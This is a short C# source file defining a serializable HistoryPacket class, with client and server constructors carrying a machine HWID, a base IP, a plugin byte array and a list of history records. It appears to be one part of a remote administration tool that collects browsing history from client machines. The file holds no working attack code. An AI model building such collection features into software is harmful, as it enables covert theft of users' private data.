using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class HistoryPacket : IPacket
    {
        //server
        public HistoryPacket() : base()
        {
            packetType = PacketType.RECOVERY_HISTORY;
        }

        //client
        public HistoryPacket(List<object[]> history, string baseIp, string HWID) : base()
        {

            packetType = PacketType.RECOVERY_HISTORY;
            this.baseIp = baseIp;
            this.HWID = HWID; 
            
            this.historyList = history;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<object[]> historyList { get; set; }
    }
}

